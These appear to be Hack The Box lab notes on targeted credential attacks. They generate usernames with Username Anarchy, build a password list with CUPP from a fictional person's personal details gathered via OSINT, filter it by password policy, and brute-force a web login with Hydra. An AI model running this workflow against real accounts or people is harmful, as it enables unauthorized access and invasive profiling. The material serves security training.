## Username Anarchy

```shell
3kjS@htb[/htb]$ ./username-anarchy -l
```
![](Screenshot%202026-06-14%20at%2016.14.20.png)

```shell
3kjS@htb[/htb]$ sudo apt install ruby -y 
3kjS@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git 
3kjS@htb[/htb]$ cd username-anarchy
```

```shell
3kjS@htb[/htb]$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
```
## CUPP

- `Social Media`: A goldmine of personal details: birthdays, pet names, favorite quotes, travel destinations, significant others, and more. Platforms like Facebook, Twitter, Instagram, and LinkedIn can reveal much information.
- `Company Websites`: Jane's current or past employers' websites might list her name, position, and even her professional bio, offering insights into her work life.
- `Public Records`: Depending on jurisdiction and privacy laws, public records might divulge details about Jane's address, family members, property ownership, or even past legal entanglements.
- `News Articles and Blogs`: Has Jane been featured in any news articles or blog posts? These could shed light on her interests, achievements, or affiliations.

| Field               | Details                      |
| ------------------- | ---------------------------- |
| Name                | Jane Smith                   |
| Nickname            | Janey                        |
| Birthdate           | December 11, 1990            |
| Relationship Status | In a relationship with Jim   |
| Partner's Name      | Jim (Nickname: Jimbo)        |
| Partner's Birthdate | December 12, 1990            |
| Pet                 | Spot                         |
| Company             | AHI                          |
| Interests           | Hackers, Pizza, Golf, Horses |
| Favorite Colors     | Blue                         |

```shell
3kjS@htb[/htb]$ sudo apt install cupp -y
```

```shell
3kjS@htb[/htb]$ cupp -i
```
![](Screenshot%202026-06-14%20at%2016.16.34.png)
![](Screenshot%202026-06-14%20at%2016.16.42.png)

```shell
3kjS@htb[/htb]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

```shell
3kjS@htb[/htb]$ hydra -L jane_smith_usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```
